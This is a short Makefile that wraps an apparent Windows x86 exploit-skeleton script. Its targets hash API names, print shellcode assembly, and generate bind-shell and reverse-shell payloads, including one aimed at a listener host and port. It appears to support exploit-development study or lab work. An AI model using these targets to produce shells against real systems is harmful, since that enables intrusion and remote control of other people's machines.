.PHONY: win32-help win32-hash win32-list-snippets win32-show-asm-bind win32-show-asm-rev win32-bindshell win32-revshell win32-test-smoke

SKELETON := Exploits/windows_x86/skeleton.py
FUNC ?= LoadLibraryA
PORT ?= 1337
LHOST ?= 127.0.0.1
LPORT ?= 443

win32-help:
	@echo "Windows x86 skeleton quick tasks"
	@echo "  make win32-list-snippets"
	@echo "  make win32-hash FUNC=CreateProcessA"
	@echo "  make win32-show-asm-bind PORT=4444"
	@echo "  make win32-show-asm-rev LHOST=192.168.45.174 LPORT=443"
	@echo "  make win32-test-smoke"
	@echo "  make win32-bindshell PORT=1337"
	@echo "  make win32-revshell LHOST=127.0.0.1 LPORT=443"

win32-hash:
	python $(SKELETON) --hash-only $(FUNC)

win32-list-snippets:
	python $(SKELETON) --list-snippets

win32-show-asm-bind:
	python $(SKELETON) --show-asm --mode bindshell --port $(PORT)

win32-show-asm-rev:
	python $(SKELETON) --show-asm --mode revshell --lhost $(LHOST) --lport $(LPORT)

win32-test-smoke:
	pytest -q tests/test_windows_x86_skeleton_smoke.py

win32-bindshell:
	python $(SKELETON) --mode bindshell --port $(PORT)

win32-revshell:
	python $(SKELETON) --mode revshell --lhost $(LHOST) --lport $(LPORT)
